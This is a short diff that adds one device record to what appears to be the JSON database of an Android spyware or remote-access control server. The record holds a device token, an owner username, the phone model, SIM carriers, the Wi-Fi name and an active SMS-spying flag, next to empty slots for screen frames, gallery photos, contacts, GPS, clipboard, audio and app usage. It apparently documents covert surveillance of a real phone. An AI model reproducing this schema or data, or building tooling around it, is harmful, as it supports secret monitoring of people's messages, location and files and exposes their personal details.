@@ -8108,5 +8108,37 @@
     "audioList": [],
     "lastAppUsage": null,
     "appList": null
+  },
+  {
+    "deviceId": "pxc_42188cda",
+    "deviceName": "HP-TES123-C0EA",
+    "ownerUsername": "blay vip",
+    "token": "2eb33445318fe23d22724dfe934e1df6",
+    "lastSeen": 1775062979031,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-04-01T17:02:59.031Z",
+    "deviceInfo": {
+      "model": "realme RMX2180",
+      "androidVersion": "Android 11",
+      "battery": 76,
+      "network": "WiFi: iPhone 13 pro max",
+      "sim1": "AXIS",
+      "sim2": "XL Axiata"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
+    "appList": null
   }
 ]
